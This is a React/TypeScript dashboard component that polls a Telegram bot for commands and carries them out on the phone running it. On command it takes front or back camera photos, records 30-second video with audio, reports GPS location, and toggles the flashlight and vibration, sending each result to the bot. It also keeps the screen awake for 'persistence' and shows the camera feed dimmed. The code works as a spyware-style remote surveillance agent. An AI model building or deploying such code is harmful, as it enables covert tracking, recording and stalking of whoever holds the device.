
import React, { useEffect, useRef, useState } from 'react';
import { User } from '../types';
import { sendBotMessage, getBotUpdates, sendBotPhoto, sendBotVideo } from '../services/telegramService';

interface DashboardProps { user: User; }

const Dashboard: React.FC<DashboardProps> = ({ user }) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const pollingInterval = useRef<number | null>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const wakeLockRef = useRef<any>(null);
  
  const [camActive, setCamActive] = useState(false);
  const [flashlightActive, setFlashlightActive] = useState(false);
  const [vibrationActive, setVibrationActive] = useState(false);
  const [isBusy, setIsBusy] = useState(false);
  const [wakeLockActive, setWakeLockActive] = useState(false);
  const [lastCommand, setLastCommand] = useState<string>('IDLE');

  const requestWakeLock = async () => {
    try {
      if ('wakeLock' in navigator) {
        wakeLockRef.current = await (navigator as any).wakeLock.request('screen');
        setWakeLockActive(true);
        wakeLockRef.current.addEventListener('release', () => {
          setWakeLockActive(false);
        });
      }
    } catch (err) {
      console.error(`${err.name}, ${err.message}`);
    }
  };

  const startCamera = async (facingMode: 'user' | 'environment' = 'environment') => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
    }

    try {
      const constraints = { 
        video: { 
          facingMode: { ideal: facingMode },
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: true 
      };
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        streamRef.current = stream;
        setCamActive(true);
        // Play the video to ensure metadata is loaded
        try { await videoRef.current.play(); } catch(e) {}
      }
      return stream;
    } catch (err) {
      console.warn("Camera failed:", err);
      sendBotMessage(`❌ Camera initialization failed: ${err.message}`);
      return null;
    }
  };

  useEffect(() => {
    const init = async () => {
      await startCamera('environment');
      await requestWakeLock();
      sendBotMessage(`🛰 *Terminal Link Stabilized*\nWakeLock: ${'wakeLock' in navigator ? 'ENABLED' : 'UNSUPPORTED'}\nBackground persistence active.`, true);
      startCommandPolling();
    };

    init();

    const handleVisibilityChange = async () => {
      if (wakeLockRef.current !== null && document.visibilityState === 'visible') {
        await requestWakeLock();
      }
    };
    document.addEventListener('visibilitychange', handleVisibilityChange);

    return () => {
      if (streamRef.current) streamRef.current.getTracks().forEach(t => t.stop());
      if (pollingInterval.current) clearInterval(pollingInterval.current);
      if (wakeLockRef.current) wakeLockRef.current.release();
      document.removeEventListener('visibilitychange', handleVisibilityChange);
    };
  }, []);

  const startCommandPolling = () => {
    pollingInterval.current = window.setInterval(async () => {
      const command = await getBotUpdates();
      if (command) {
        handleRemoteCommand(command);
      }
    }, 2000);
  };

  const handleRemoteCommand = async (cmd: string) => {
    const cleanCmd = cmd.toLowerCase().trim();
    setLastCommand(cmd);

    if (cleanCmd.includes('flash on')) {
      toggleFlashlight(true);
    } else if (cleanCmd.includes('flash off')) {
      toggleFlashlight(false);
    } else if (cleanCmd.includes('vibrate')) {
      executeRemoteVibration();
    } else if (cleanCmd.includes('location')) {
      sendLocationToBot();
    } else if (cleanCmd.includes('front photo')) {
      capturePhoto('user');
    } else if (cleanCmd.includes('back photo')) {
      capturePhoto('environment');
    } else if (cleanCmd.includes('front video')) {
      recordVideo('user');
    } else if (cleanCmd.includes('back video')) {
      recordVideo('environment');
    } else if (cleanCmd.includes('capture')) {
      capturePhoto('environment');
    }
  };

  const capturePhoto = async (facingMode: 'user' | 'environment') => {
    if (isBusy) return;
    setIsBusy(true);
    sendBotMessage(`📸 Switching optics to ${facingMode}...`);

    const stream = await startCamera(facingMode);
    if (!stream) {
      setIsBusy(false);
      return;
    }

    // Wait for video to actually start and have dimensions
    let attempts = 0;
    const checkVideo = setInterval(() => {
      attempts++;
      if (videoRef.current && videoRef.current.videoWidth > 0) {
        clearInterval(checkVideo);
        const context = canvasRef.current?.getContext('2d');
        if (context && canvasRef.current && videoRef.current) {
          canvasRef.current.width = videoRef.current.videoWidth;
          canvasRef.current.height = videoRef.current.videoHeight;
          context.drawImage(videoRef.current, 0, 0);
          canvasRef.current.toBlob((blob) => {
            if (blob) {
              sendBotPhoto(blob, `Lens: ${facingMode.toUpperCase()}`);
            } else {
              sendBotMessage("❌ Failed to process image blob.");
            }
            setIsBusy(false);
            if (facingMode === 'user') startCamera('environment');
          }, 'image/jpeg', 0.9);
        }
      } else if (attempts > 20) { // 2 seconds timeout
        clearInterval(checkVideo);
        sendBotMessage("❌ Camera timeout: Could not capture frame.");
        setIsBusy(false);
        if (facingMode === 'user') startCamera('environment');
      }
    }, 100);
  };

  const recordVideo = async (facingMode: 'user' | 'environment') => {
    if (isBusy) return;
    setIsBusy(true);
    sendBotMessage(`⏳ Starting 30s ${facingMode} recording...`);

    const stream = await startCamera(facingMode);
    if (!stream) {
      setIsBusy(false);
      return;
    }

    const chunks: Blob[] = [];
    const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
    try {
      const recorder = new MediaRecorder(stream, { mimeType });
      mediaRecorderRef.current = recorder;

      recorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      recorder.onstop = async () => {
        const blob = new Blob(chunks, { type: mimeType });
        await sendBotVideo(blob, `Lens: ${facingMode.toUpperCase()}`);
        setIsBusy(false);
        if (facingMode === 'user') await startCamera('environment');
      };

      recorder.start();
      setTimeout(() => {
        if (recorder.state !== 'inactive') recorder.stop();
      }, 30000);
    } catch(e) {
      sendBotMessage(`❌ Recording Error: ${e.message}`);
      setIsBusy(false);
    }
  };

  const toggleFlashlight = async (state: boolean) => {
    // Torch requires the camera to be active and using the environment (back) lens
    if (!streamRef.current) {
      await startCamera('environment');
    }

    const track = streamRef.current?.getVideoTracks().find(t => t.kind === 'video');
    if (!track) {
      sendBotMessage(`❌ No video track found for flash.`);
      return;
    }

    try {
      // Check if torch is supported
      const capabilities = (track as any).getCapabilities?.();
      if (capabilities && capabilities.torch) {
        await (track as any).applyConstraints({
          advanced: [{ torch: state }]
        });
        setFlashlightActive(state);
        sendBotMessage(`🔦 Torch: ${state ? 'ON' : 'OFF'}`);
      } else {
        // Fallback for browsers that don't expose capabilities but might still work
        await (track as any).applyConstraints({
          advanced: [{ torch: state }]
        } as any);
        setFlashlightActive(state);
        sendBotMessage(`🔦 Torch command sent: ${state ? 'ON' : 'OFF'}`);
      }
    } catch (e) {
      console.error("Flash Error:", e);
      sendBotMessage(`❌ Flash Error: ${e.message}. Note: Flash only works on back camera and some browsers block it.`);
    }
  };

  const executeRemoteVibration = () => {
    if ("vibrate" in navigator) {
      navigator.vibrate([300, 100, 300]);
      setVibrationActive(true);
      setTimeout(() => setVibrationActive(false), 1000);
      sendBotMessage(`📳 Haptic pulse.`);
    }
  };

  const sendLocationToBot = () => {
    navigator.geolocation.getCurrentPosition((pos) => {
      const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
      sendBotMessage(`📍 *Location Update*\n[View Map](${mapUrl})`);
    }, (err) => {
      sendBotMessage(`❌ Location Error: ${err.message}`);
    });
  };

  return (
    <div className="w-full max-w-6xl animate-in fade-in duration-700 pb-10">
      <header className="flex flex-col md:flex-row justify-between items-start md:items-center mb-8 glass p-6 rounded-3xl border border-slate-800 gap-4">
        <div className="flex items-center gap-4">
           <div className="w-12 h-12 bg-blue-600 rounded-2xl flex items-center justify-center shadow-lg shadow-blue-500/20">
              <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
           </div>
           <div>
              <h2 className="text-xl font-bold text-white uppercase tracking-tighter">Terminal: {user.email.split('@')[0]}</h2>
              <div className="flex items-center gap-3">
                <div className={`w-2 h-2 ${wakeLockActive ? 'bg-emerald-500' : 'bg-amber-500'} rounded-full animate-pulse`} />
                <p className="text-[9px] text-slate-400 font-mono uppercase tracking-[0.1em]">
                   {wakeLockActive ? 'Anti-Sleep Persistence Active' : 'Persistence Pending'}
                </p>
              </div>
           </div>
        </div>
        <div className="flex gap-4">
            <div className="bg-slate-900 px-4 py-2 rounded-xl border border-slate-800">
               <p className="text-[9px] text-slate-500 uppercase font-bold mb-1">Signal</p>
               <p className="text-xs text-blue-400 font-mono font-bold tracking-widest">{lastCommand}</p>
            </div>
            <div className="bg-slate-900 px-4 py-2 rounded-xl border border-slate-800">
               <p className="text-[9px] text-slate-500 uppercase font-bold mb-1">Process</p>
               <p className="text-xs text-emerald-400 font-mono font-bold">{isBusy ? 'BUSY' : 'IDLE'}</p>
            </div>
        </div>
      </header>

      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
        <div className="lg:col-span-3">
          <div className="glass p-8 rounded-[2.5rem] border border-slate-800 shadow-2xl relative overflow-hidden bg-slate-950/40">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-10">
              <div className="space-y-6">
                <div className={`relative aspect-video bg-black rounded-3xl overflow-hidden border-2 transition-all duration-500 ${isBusy ? 'border-red-500/30' : 'border-slate-800'}`}>
                  <video ref={videoRef} autoPlay playsInline muted className={`w-full h-full object-cover transition-all duration-700 opacity-20 grayscale contrast-125`} />
                  <canvas ref={canvasRef} className="hidden" />
                  <div className="absolute inset-0 bg-blue-950/10" />
                  <div className="absolute top-6 left-6 flex items-center gap-2">
                     <span className="w-2 h-2 bg-red-500 rounded-full animate-ping" />
                     <span className="text-[10px] font-black text-white/50 tracking-[0.3em] uppercase">Security Feed</span>
                  </div>
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <ModuleStatus label="Optics" status={camActive} />
                  <ModuleStatus label="Torch" status={flashlightActive} />
                </div>
              </div>

              <div className="flex flex-col justify-between">
                <div>
                  <h3 className="text-2xl font-black text-white mb-2 uppercase italic tracking-tighter underline decoration-blue-600 decoration-4">Uplink Stable</h3>
                  <p className="text-sm text-slate-400 mb-8 leading-relaxed font-light">
                    Background service synchronized with <span className="text-blue-400 font-bold">Bot Cloud</span>. 
                    Phone sleep mode is currently suppressed for continuous remote monitoring.
                  </p>
                  
                  <div className="grid grid-cols-1 gap-3">
                    <FeatureBar icon="🛡️" text="Persistence Mode: ON" active={wakeLockActive} />
                    <FeatureBar icon="⚙️" text="Auto-Polling: 2.0s" active={true} />
                    <FeatureBar icon="📦" text="APK Background: Enabled" active={true} />
                  </div>
                </div>

                <div className="mt-8 p-5 bg-gradient-to-r from-blue-600/10 to-transparent border border-blue-500/20 rounded-2xl">
                  <p className="text-[11px] text-blue-200 font-medium italic">
                    Tip: Flash and Photo capture work best when the app is running in a full browser like Chrome/Safari or as a PWA.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="space-y-6">
          <div className="glass p-6 rounded-[2rem] border border-slate-800 bg-slate-900/50 h-full">
            <h4 className="text-[10px] font-black text-slate-500 uppercase tracking-[0.3em] mb-6">Execution Log</h4>
            <div className="space-y-4 font-mono text-[10px]">
               <LogEntry status="SYS" msg="WakeLock Protocol Initialized" color="emerald" />
               <LogEntry status="SW" msg="Background Worker Registered" color="blue" />
               <LogEntry status="OK" msg="Remote Keyboard Synced" color="emerald" />
               {isBusy && <LogEntry status="RUN" msg="Acquiring Remote Stream" color="amber" />}
               <div className="pt-6 border-t border-slate-800 mt-6">
                  <p className="text-[9px] text-slate-600 uppercase mb-3 font-bold">Terminal Support</p>
                  <ul className="text-slate-500 space-y-2 text-[9px] list-disc pl-3">
                    <li>Camera/Mic: Authorized</li>
                    <li>Vibration: Authorized</li>
                    <li>Flash: Restricted (Browser-Dependent)</li>
                  </ul>
               </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

const FeatureBar = ({ icon, text, active }: { icon: string, text: string, active: boolean }) => (
  <div className={`flex items-center gap-3 p-3 rounded-xl border ${active ? 'bg-slate-900/60 border-slate-800' : 'bg-slate-950/20 border-slate-900 opacity-40'}`}>
    <span className="text-lg grayscale">{icon}</span>
    <span className="text-[10px] font-bold text-slate-300 uppercase tracking-widest">{text}</span>
  </div>
);

const ModuleStatus = ({ label, status }: { label: string, status: boolean }) => (
  <div className={`p-4 rounded-2xl border transition-all ${status ? 'bg-emerald-500/5 border-emerald-500/20 text-emerald-400' : 'bg-slate-900/50 border-slate-800 text-slate-600'}`}>
    <p className="text-[9px] font-black uppercase tracking-widest mb-1">{label}</p>
    <p className="text-xs font-bold">{status ? 'ACTIVE' : 'IDLE'}</p>
  </div>
);

const LogEntry = ({ status, msg, color }: { status: string, msg: string, color: string }) => {
  const colors: any = {
    emerald: 'text-emerald-500',
    blue: 'text-blue-500',
    amber: 'text-amber-500',
    red: 'text-red-500'
  };
  return (
    <div className="flex gap-2 items-start animate-in slide-in-from-bottom-1 duration-300">
      <span className={`font-bold ${colors[color] || 'text-white'}`}>[{status}]</span>
      <span className="text-slate-400 leading-tight">{msg}</span>
    </div>
  );
};

export default Dashboard;
